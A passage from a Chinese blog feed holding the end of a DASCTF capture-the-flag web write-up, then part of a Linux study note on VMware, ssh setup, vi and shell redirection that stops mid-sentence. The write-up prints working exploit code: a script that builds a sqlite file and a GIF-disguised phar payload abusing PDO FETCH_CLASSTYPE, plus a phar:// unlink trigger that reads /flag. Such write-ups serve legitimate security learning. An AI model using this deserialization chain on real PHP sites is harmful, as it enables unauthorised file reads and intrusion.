处入手</p><blockquote><p>通过<code>User::__destruct</code>-&gt;<code>User::log</code> ,User::log 指定查询数据库来源，设定<code>&quot;options&quot;=&gt;[PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_CLASS|PDO::FETCH_CLASSTYPE,]]</code>，使得<strong>查询结果第一列返回结果作为类名实例化</strong>，之后的结果会变成属性名和属性值进行赋值，对于未定义的属性会触发这个类的<code>__set</code>方法。比如说数据库第一行结果为 UserMessage，那么会实例化 UserMessage</p></blockquote><p><a href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250131230900317.png" alt="image-20250131230900317"></p><p>所以要构造一个数据库，不出网的情况下当然是要选择 sqlite 这种基于文件的数据库，如果出网也可以直接连到 vps 上的mysql</p><p>使用 python 生成一个</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">def gen_db(db_path):    conn &#x3D; sqlite3.connect(db_path)    cursor &#x3D; conn.cursor()    cursor.execute(&#39;&#39;&#39;    CREATE TABLE IF NOT EXISTS users (        username TEXT NOT NULL,        filePath TEXT NOT NULL,        password TEXT NOT NULL,        id INTEGER PRIMARY KEY AUTOINCREMENT    )    &#39;&#39;&#39;)    users &#x3D; [        (&#39;UserMessage&#39;, &#39;&#x2F;flag&#39;, &#39;&#x2F;flag&#39;),    ]    cursor.executemany(&#39;&#39;&#39;    INSERT INTO users (username, password,filePath) VALUES (?,?,?)    &#39;&#39;&#39;, users)    conn.commit()    cursor.execute(&#39;SELECT * FROM users&#39;)    conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>users 表结构如下：</p><table><thead><tr><th>username</th><th>filePath</th><th>password</th><th>id</th></tr></thead><tbody><tr><td>UserMessage</td><td>&#x2F;flag</td><td>&#x2F;flag</td><td>1</td></tr></tbody></table><p>这样子就会实例化 UserMessage 类，然后 filePath 为 &#x2F;flag，之后的 password 和 id 由于是未定义的变量名会触发 __set，从而读取flag</p><br><p>那么进行实操，base64写入sqlite文件</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250202223314903.png" alt="image-20250202223314903"></p><p>然后构造phar包：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PDO_connect</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$con_options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//use to set options of PDO connections</span>    <span class="token keyword">public</span> <span class="token variable">$smt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string double-quoted-string">"dsn"</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'sqlite:/var/www/html/txt/06a20bd1595de64a76f6acce257c8bed.txt'</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"username"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"password"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"options"</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span> <span class="token operator">=></span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token class-name">FETCH_CLASS</span> <span class="token operator">|</span> <span class="token class-name">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_CLASSTYPE</span><span class="token punctuation">,</span><span class="token punctuation">]</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'users'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO_connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UserMessage"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"aaaaaaaaaaaaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样base64编码传输，注意传 phar 包的 base64 需要再进行一次url编码</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250202231613642.png" alt="image-20250202231613642"></p><p>然后 unlink 删除这个文件触发 phar 反序列化，注意删除这里已经补全了 .txt 后缀：<code>phar:///var/www/html/txt/189fbb1b7e7a116f9c06cd8cb4396429</code></p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250202231718748.png" alt="image-20250202231718748"></p><p>此时访问 log 下 &#x2F;flag 的md5编码路径就能得到flag了</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250202231805699.png" alt="image-20250202231805699"></p><br><p>好nb的思路，给我两三天我都不一定想得到</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;时隔一年，这次连签到都差点做不来了&lt;/p&gt;
&lt;p&gt;唉唉web又爆零了，埋了，得了一种打 DAS 就做不动题的病&lt;/p&gt;
&lt;p&gt;等期末考完再复现，要被期末考薄纱了😭&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/gxngxngxn/p/18620905&quot;&gt;https://www.cnblogs.com/gxngxngxn/p/18620905&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#&quot;&gt;https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/&quot;&gt;https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux从0.5到1</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/</id>
    <published>2024-12-15T17:47:48.000Z</published>
    <updated>2024-12-18T04:03:42.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>期末自查用</p><span id="more"></span><hr><h1 id="VMware配置"><a href="#VMware配置" class="headerlink" title="VMware配置"></a>VMware配置</h1><h2 id="安装RHEL6-3"><a href="#安装RHEL6-3" class="headerlink" title="安装RHEL6.3"></a>安装RHEL6.3</h2><p>虚拟磁盘设置为30G，采用动态分配硬盘方式，并设置为分割多个小文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps1.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps2.jpg" alt="img"></p><p>DVD 导入准备的光盘，使用 ISO 映像文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps3.jpg" alt="img"></p><p>正式进入安装界面</p><p>磁盘分区：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps4.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps5.jpg" alt="img"></p><p>自定义软件安装包</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps8.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps6.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps7.jpg" alt="img"></p><hr><h2 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h2><p>以 NAT 模式为例，这样子主机相当于路由器，给虚拟机分配一层内网地址（桥接模式则会和主机在同一网段分配 ip 地址）</p><p>虚拟机网络设置为 NAT 模式</p><p>主机网络适配器启动 VMnet8  网卡</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101636472.png" alt="image-20241216101636472"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101704214.png" alt="image-20241216101704214"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101801687.png" alt="image-20241216101801687"></p><p>然后保证右下角这个图标处于启动状态</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216102028365.png" alt="image-20241216102028365"></p><p>同时虚拟机内连接网络，这里是 System eth0</p><p>然后主机和虚拟机之间相互ping一下测试网络连通性（主机需关闭防火墙才能被 ping 通）</p><h2 id="ssh远程登录"><a href="#ssh远程登录" class="headerlink" title="ssh远程登录"></a>ssh远程登录</h2><h3 id="启动-ssh-服务"><a href="#启动-ssh-服务" class="headerlink" title="启动 ssh 服务"></a>启动 ssh 服务</h3><p>debian 系</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openssh-server<span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> start <span class="token comment"># 启动服务</span><span class="token function">sudo</span> systemctl start <span class="token function">ssh</span> <span class="token comment"># 较新的系统启动服务</span><span class="token function">sudo</span> /etc/init.d/ssh restart <span class="token comment"># 重启服务</span><span class="token comment"># 或</span><span class="token function">sudo</span> systemctl restart <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>centos 系</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> openssh-server<span class="token function">sudo</span> <span class="token function">service</span> sshd start<span class="token comment"># 或</span><span class="token function">sudo</span> systemctl start sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查是否启动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span class="token function">netstat</span> <span class="token parameter variable">-an</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="配置-ssh"><a href="#配置-ssh" class="headerlink" title="配置 ssh"></a>配置 ssh</h3><p>允许密码身份验证：编辑 &#x2F;etc&#x2F;ssh&#x2F;ssh_config 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PasswordAuthentication <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>允许root用户登录：编辑 &#x2F;etc&#x2F;ssh&#x2F;ssh_config 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># PermitRootLogin prohibit-password</span>PermitRootLogin <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重新加载ssh配置：重载或重启</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl reload <span class="token function">ssh</span><span class="token function">sudo</span> systemctl restart <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="Shell命令行"><a href="#Shell命令行" class="headerlink" title="Shell命令行"></a>Shell命令行</h1><h2 id="虚拟控制台"><a href="#虚拟控制台" class="headerlink" title="虚拟控制台"></a>虚拟控制台</h2><p>除了桌面启动终端窗口，ssh连接终端以外，还可以使用 linux 的虚拟控制台，在 RHEL 6 上对应的设备是 &#x2F;dev&#x2F;tty2、&#x2F;dev&#x2F;tty3、&#x2F;dev&#x2F;tty4、&#x2F;dev&#x2F;tty5、&#x2F;dev&#x2F;tty6</p><p>此种运行等级为 run level 3，纯文本终端 （图形登录环境 tty1 的运行等级为 run level 5）</p><p>使用 ctrl+alt+f2&#x2F;f3&#x2F;f4&#x2F;f5&#x2F;f6 可以切换</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps9.jpg" alt="img"></p><p>alt + f3 可以切换为控制台 tty3</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps10.jpg" alt="img"></p><p>这里登录时间后面显示的是主机地址，如果是远程主机则会显示其 ip</p><p>默认登录运行级别的设置可以修改 &#x2F;etc&#x2F;inittab 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">id:3:initdefault:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Shell-命令提示符"><a href="#Shell-命令提示符" class="headerlink" title="Shell 命令提示符"></a>Shell 命令提示符</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhelserver /etc<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>[]</code>内的内容即为 Shell 提示符：格式<code>用户名@主机名 当前目录</code></p><p><code>~</code>符号是表示<strong>用户主目录的 Shell 变量</strong></p><p>Shell 命令提示符的显示内容可以通过修改 Shell 的环境变量 PS1 来实现</p><hr><h2 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h2><p>记一些之前没怎么用过的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">reboot</span><span class="token comment"># 重启</span><span class="token function">halt</span><span class="token function">shutdown</span><span class="token comment"># 关机</span><span class="token builtin class-name">cd</span><span class="token comment"># 直接切换到用户主目录</span><span class="token builtin class-name">cd</span> -<span class="token comment"># 回到前一次工作目录</span><span class="token function">mkdir</span> <span class="token punctuation">[</span>-p/--parents<span class="token punctuation">]</span> <span class="token punctuation">[</span>目录<span class="token punctuation">]</span><span class="token comment"># -p 建立尚不存在的目录，即多层目录</span><span class="token function">rmdir</span> <span class="token punctuation">[</span>-p<span class="token punctuation">]</span> <span class="token punctuation">[</span>目录<span class="token punctuation">]</span><span class="token function">dmesg</span><span class="token comment"># 查看内核日志</span><span class="token function">ls</span> <span class="token parameter variable">-d</span><span class="token comment"># 显示指定目录的详细信息，不显示子目录及文件</span><span class="token function">ls</span> <span class="token parameter variable">-R</span><span class="token comment"># 递归列出所有子目录下的文件和目录</span><span class="token function">ls</span> <span class="token parameter variable">-i</span><span class="token comment"># 查询inode号</span><span class="token function">tail</span> <span class="token punctuation">[</span>-n<span class="token punctuation">]</span> 文件名<span class="token function">head</span> <span class="token punctuation">[</span>-n<span class="token punctuation">]</span> 文件名<span class="token comment"># 查看某文件的末尾/头几行，-n指定行数，默认10行</span><span class="token function">cut</span> -d<span class="token punctuation">\</span>  <span class="token parameter variable">-f1</span> data.txt<span class="token comment"># -d指定以空格为分隔符，-f指定显示每行分隔出的第一个字段</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216153437229.png" alt="image-20241216153437229"></p><p>使用ls命令查看&#x2F;root&#x2F;lab4&#x2F;file目录下的各个文件的inode编号：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/9.jpg" alt="img"></p><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token punctuation">[</span>-clnvi<span class="token punctuation">]</span> <span class="token operator">&lt;</span>pattern<span class="token operator">></span> <span class="token operator">&lt;</span>files<span class="token operator">></span><span class="token parameter variable">-c</span> <span class="token comment"># 只显示符合字符串模式的总行数</span><span class="token parameter variable">-l</span> <span class="token comment"># 只显示符合字符串模式的文件的文件名</span><span class="token parameter variable">-n</span> <span class="token comment"># 显示匹配行的行号</span><span class="token parameter variable">-v</span> <span class="token comment"># 反选</span><span class="token parameter variable">-i</span> <span class="token comment"># 忽略大小写</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token punctuation">[</span>-hnV<span class="token punctuation">]</span><span class="token punctuation">[</span>-e<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-f<span class="token operator">&lt;</span>script文件<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>文本文件<span class="token punctuation">]</span>-e<span class="token operator">&lt;</span>script<span class="token operator">></span>/--expression<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span> <span class="token comment"># 以选项中指定的script来处理输入的文本文件。</span>-f<span class="token operator">&lt;</span>script文件<span class="token operator">></span>/--file<span class="token operator">=</span><span class="token operator">&lt;</span>script文件<span class="token operator">></span> <span class="token comment"># 以选项中指定的script文件来处理输入的文本文件。</span>-n/--quiet/--silent <span class="token comment"># 仅显示script处理后的结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Shell-功能"><a href="#Shell-功能" class="headerlink" title="Shell 功能"></a>Shell 功能</h2><p>以 Bash Shell 为准</p><ol><li><p>历史命令记忆功能</p><p>前一次登录以前所执行过的 Shell 命令被保存在用户主目录下的 .bash_history 文件中</p></li><li><p>Tab键补全</p></li><li><p>文件名通配</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>*</td><td>匹配0个或多个字符</td></tr><tr><td>?</td><td>匹配任意一个字符</td></tr><tr><td>[list]</td><td>匹配 list 中的任意单一字符</td></tr><tr><td>[c1-c2]</td><td>匹配 c1-c2 中的任意单一字符</td></tr><tr><td>[!list]</td><td>匹配除 list 中的任意单一字符</td></tr><tr><td>{string1,string2,…}</td><td>匹配 string1 或 string2 （或更多）其一字符串</td></tr></tbody></table></li><li><p>命令别名 alias</p></li></ol><hr><h2 id="vi-命令行编辑文件"><a href="#vi-命令行编辑文件" class="headerlink" title="vi 命令行编辑文件"></a>vi 命令行编辑文件</h2><h3 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h3><p>命令模式 –&gt; 文本编辑模式：i、I、a、A、o、O</p><p>扩展命令模式：Esc 回到命令模式，输入<code>:</code>切换到扩展命令模式</p><p>退出vi：</p><ul><li><code>wq</code>保存文件，<code>wq newfile</code>或<code>w newfile</code>另存为新文件名</li><li><code>q!</code>不保存退出</li><li>在命令模式下输入<code>ZZ</code>，会保存当前文件的修改，并退出 vi 编辑器</li></ul><h3 id="vi-命令"><a href="#vi-命令" class="headerlink" title="vi 命令"></a>vi 命令</h3><p>命令模式下</p><ol><li><p>命令模式 –&gt; 文本编辑模式</p><p>i：从当前光标位置开始输入字符</p><p>I：光标移动到当前光标所在行的行首，开始输入字符</p><p>a：从当前光标后开始输入字符，也就是在当前光标所在的字符后开始插入新字符</p><p>A：光标移动到当前光标所在行的行尾，开始输入字符</p><p>o：在当前光标所在行之下新增一行</p><p>O：在当前光标所在行之上新增一行</p></li><li><p>光标移动命令</p><p>h：左移，如果在 h 前输入数字 n，则光标左移 n 个字符，下同</p><p>l：右移</p><p>j：上移</p><p>k：下移</p><p>0：移到行首</p><p>$：移到行尾</p><p>G：移动到文件的最后一行的行首</p><p>nG：移到第n行的行首</p><p>H：移到屏幕上显示的第一行</p><p>L：移到屏幕上显示的最后一行</p><p>M：移到屏幕的中间一行</p><p>w或W：右移至下一个单词的词首</p><p>e或E：移动到单词尾，若已处于当前的单词尾则移动到下一个单词尾</p><p>b或B：移动到词首，若已处于当前的单词首则移动到上一个单词首</p><br><p>此外，还有扩展模式命令</p><p><code>:n</code> ：光标移到文件的第n行</p><p><code>:$</code> ：光标移到文件的最后一行</p></li><li><p>替换删除命令</p><p>r：使用随后输入的字符替换当前光标所在的字符</p></li><li><p>剪切命令</p><p>d：剪切选定块到缓冲区</p></li><li><p>复制命令</p><p>y：复制选定块到缓冲区</p></li><li><p>粘贴命令</p><p>p：粘贴到当前光标后</p><p>P：粘贴到当前光标前</p></li><li><p>v 命令进入可视模式，用于选定区域</p></li><li><p>u 命令撤销前一次修改</p></li><li><p>查找命令</p><p>&#x2F;pattern：从光标开始处向后搜索 pattern 字符串</p><p>?pattern：从光标开始处向前搜索 pattern 字符串</p><p>n：在同方向重复上一次搜索命令</p><p>N：在反方向重复上一次搜索命令</p></li><li><p>扩展命令模式中——替换命令s</p><p><code>:s/p1/p2</code>：将当前行第一次出现的 p1 用 p2 替代</p><p><code>:s/p1/p2/g</code>：将当前行中所有 p1 均用 p2 替代</p></li></ol><hr><h2 id="扩展-Shell-命令"><a href="#扩展-Shell-命令" class="headerlink" title="扩展 Shell 命令"></a>扩展 Shell 命令</h2><h3 id="Shell-命令替换"><a href="#Shell-命令替换" class="headerlink" title="Shell 命令替换"></a>Shell 命令替换</h3><p>在Bash Shell中，反引号 &#96; 作为命令替换功能使用，具有内联执行的功能</p><p>于是就有了这样的用法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /lib/modules/<span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> <span class="token parameter variable">-r</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Shell-输入-x2F-输出的重定向与管道"><a href="#Shell-输入-x2F-输出的重定向与管道" class="headerlink" title="Shell 输入&#x2F;输出的重定向与管道"></a>Shell 输入&#x2F;输出的重定向与管道</h3><h4 id="标准输入-x2F-输出"><a href="#标准输入-x2F-输出" class="headerlink" title="标准输入&#x2F;输出"></a>标准输入&#x2F;输出</h4><p>在 Linux 系统中，每条 shell 命令对应的进程都有三个与之相关的输入&#x2F;输出流，对应特殊的文件描述指针：</p><ul><li>标准输入，文件描述指针为0：执行该进程时，进程获得用户从键盘输入的数据</li><li>标准输出，文件描述指针为1：命令执行后传回的正确信息</li><li>标准错误输出，文件描述指针为2：命令执行失败后传回的错误信息</li></ul><p>以 cat 命令为例，如果 cat 的命令行中没有参数，它就会从标准输入中读取数据，并将其送到标准输出，用户输入的每一行都立刻被 cat 命令输出到屏幕上，直到 ctrl+d 结束输入，cat 命令运行结束</p><h4 id="输入-x2F-输出重定向"><a href="#输入-x2F-输出重定向" class="headerlink" title="输入&#x2F;输出重定向"></a>输入&#x2F;输出重定向</h4><ul><li><p>输入重定向：把命令（或可执行程序）的标准输入重定向为从指定的文件获取输入数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令<span class="token operator">&lt;</span>文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用于不接受文件名作为输入参数的命令，要输入的内容又存在一个文件时</p><br></li><li><p>输出重定向：把命令（或可执行程序）的标准输出或标准错误输出重定向到指定文件中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令<span class="token operator">></span>文件名<span class="token operator"><span class="token file-descriptor important">1</span>></span> <span class="token comment">#stdout</span><span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token comment">#stderr</span>命令<span class="token operator">>></span>文件名 <span class="token comment">#追加到文件尾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br></li><li><p>Here Documents 输入重定向：将一对分隔符之间的正文重定向输入给命令</p><p>在<code>&lt;&lt;</code>操作符后面，任何字符都可以作为正文开始前的分隔符，Here 文档的正文一直延续到另一个分隔符为止，第二个分隔符应出现在新行的开头，即分隔符前面不能有空格，分隔符后面必须是回车符</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">command<span class="token operator">&lt;&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> limit_stringmsg_bodylimit_string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果使用<code>&lt;&lt;-</code>，则 msg_body 和 limit_string 行中的所有前缀 Tab 字符都将被忽略（但空格不会被忽略）</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216210643592.png" alt="image-20241216210643592"></p></li></ul><h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>将一个 shell 命令的输出结果传递给另一个 shell 命令作为输入时，可以使用 linux shell 提供的管道功能</p><p>使用管道符<code>|</code>来建立一个多条 shell 命令联合执行的命令</p><p>管道可以把一系列命令连接起来，第一个命令的输入会作为第二个命令的输入通过管道传给第二个命令</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216211314040.png" alt="image-20241216211314040"></p><hr><h2 id="Shell-变量"><a href="#Shell-变量" class="headerlink" title="Shell 变量"></a>Shell 变量</h2><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><ol><li><p>开启一个终端程序，执行命令<code>echo 